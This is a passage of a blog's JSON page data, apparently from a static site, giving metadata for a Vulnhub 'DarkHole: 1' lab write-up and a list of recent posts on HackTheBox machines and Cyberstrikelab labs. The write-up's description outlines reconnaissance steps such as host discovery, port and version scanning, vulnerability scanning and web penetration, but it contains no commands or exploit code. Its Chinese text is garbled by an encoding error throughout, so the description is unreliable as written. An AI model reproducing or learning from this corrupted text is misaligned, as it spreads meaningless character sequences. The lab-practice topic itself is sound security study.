1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"é¶æœº","description":"DarkHole: 1\n\n https://www.vulnhub.com/entry/darkhole-1,724/\n \n\nç«¯å£æ‰«æä¸»æœºå‘ç°\n\n1. æ¢æµ‹å­˜æ´»ä¸»æœºï¼Œ`184`æ˜¯é¶æœº\n    \n    \n    \n2. æ¢æµ‹ä¸»æœºæ‰€æœ‰å¼€æ”¾ç«¯å£\n    \n    \n    \n3. æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬\n    \n    \n    \n4. æ‰«ææ¼æ´\n    \n    \n    \n\nwebæ¸—é€\n\n1...."},"recentPosts":[{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"}]},"__N_SSG":true}